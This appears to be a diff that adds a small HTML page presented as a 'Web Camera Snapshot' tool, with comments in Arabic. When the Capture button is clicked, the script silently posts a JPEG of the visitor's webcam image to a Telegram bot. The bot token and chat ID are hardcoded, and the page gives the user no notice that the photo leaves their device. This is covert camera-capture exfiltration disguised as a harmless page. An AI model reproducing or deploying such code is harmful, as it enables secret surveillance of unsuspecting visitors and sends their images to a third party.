@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Web Camera Snapshot</title>
+</head>
+<body>
+    <h1>Web Camera Snapshot</h1>
+    <video id="video" width="640" height="480" autoplay></video>
+    <button id="snap">Capture</button>
+    <canvas id="canvas" width="640" height="480"></canvas>
+    <script src="script.js"></script>
+
+
+
+<script type="text/javascript">
+// تحديد العناصر
+const video = document.getElementById('video');
+const canvas = document.getElementById('canvas');
+const snapBtn = document.getElementById('snap');
+
+// الحصول على صلاحيات الكاميرا
+navigator.mediaDevices.getUserMedia({video: true})
+    .then(function(stream) {
+        video.srcObject = stream;
+    })
+    .catch(function(err) {
+        console.log('Error accessing camera: ' + err);
+    });
+
+// التقاط الصورة عند النقر على الزر
+snapBtn.addEventListener('click', function() {
+    // رسم الصورة على الكانفاس
+    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    // الحصول على بيانات الصورة بتنسيق Base64
+    const imgData = canvas.toDataURL('image/jpeg');
+
+    // إرسال الصورة إلى بوت تلغرام
+    const botToken = '6375615077:AAEPqoM5zOiA1XZRHOARXZyIvz2udVu1QD0';
+    const chatId = '5333239494';
+    const url = `https://api.telegram.org/bot6375615077:AAEPqoM5zOiA1XZRHOARXZyIvz2udVu1QD0/sendPhoto`;
+    const params = {
+        chat_id: chatId,
+        photo: imgData
+    };
+
+    fetch(url, {
+        method: 'POST',
+        body: JSON.stringify(params),
+        headers: {
+            'Content-Type': 'application/json'
+        }
+    })
+    .then(function(response) {
+        console.log('Photo sent successfully');
+    })
+    .catch(function(err) {
+        console.log('Error sending photo: ' + err);
+    });
+})
+
+
+
+</script>
+
+</body>
+</html>
